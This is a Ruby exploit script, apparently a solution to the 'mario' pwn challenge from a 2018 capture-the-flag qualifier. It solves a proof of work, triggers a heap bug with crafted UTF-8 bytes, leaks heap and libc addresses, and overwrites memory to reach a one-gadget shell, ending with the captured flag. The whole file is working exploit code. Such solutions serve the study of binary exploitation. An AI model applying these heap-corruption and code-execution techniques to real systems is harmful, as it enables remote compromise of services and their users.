#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')[0]

host, port = '83b1db91.quals2018.oooverflow.io', 31337
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = 'mario'
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================
context.arch = 'amd64' 
# context.log_level = :debug
def pow
  z.gets 'Challenge: '
  chal = z.gets.strip
  z.gets 'n: '
  n = z.gets.strip
  # chal,n='Gne27L9pyU', 22
  ans = `python ../solve_pow.py #{chal} #{n}`.scan(/(\d+)/).flatten.first.to_i
  z.puts ans
end
pow unless @local

def upset(name, cook)
  z.puts 'N'
  z.puts name
  z.puts 'O'
  z.puts 17
  16.times {
    z.puts 3
    z.puts "\xf0\x9f\xf0\x9f"
    z.puts "\x8d"
    z.puts "\x8d"
  }
  z.puts 1
  z.puts "\xf0\x9f\x8d\x85"

  # cook
  z.puts 'C'
  z.puts cook if cook
end

upset('meow', 'A' * 0x100)

z.puts 'Y'
z.puts 'W'
z.gets 'had to say: '
heap = (z.recvn(6) + "\x00\x00").u64 - 0x13470
h.offset(heap)

z.puts 'N'
z.puts 'user2'
z.puts 'L'
z.puts 'W'
z.gets 'had to say: '
libc = (z.recvn(6) + "\x00\x00").u64 - 0x3c4c78
h.offset(libc)

log.dump heap.hex
log.dump libc.hex

z.puts 'L'
z.puts 'user2'
z.puts 'O'
z.puts 1
z.puts 1
z.puts "\xf0\x9f\x8d\x85"
z.puts 'C'
z.puts 'zz'
z.puts 'L'

upset('meow2', 'A' * 0x27)
z.puts 'P'
z.puts p64(libc+0xf02a4) + 'G' * 216 + p64(heap+0x12270)

z.puts 'L'
z.puts 'user2'
z.puts 'A'
z.interact

# OOO{cr1m1n4l5_5h0uld_n07_b3_r3w4rd3d_w17h_fl4gs}
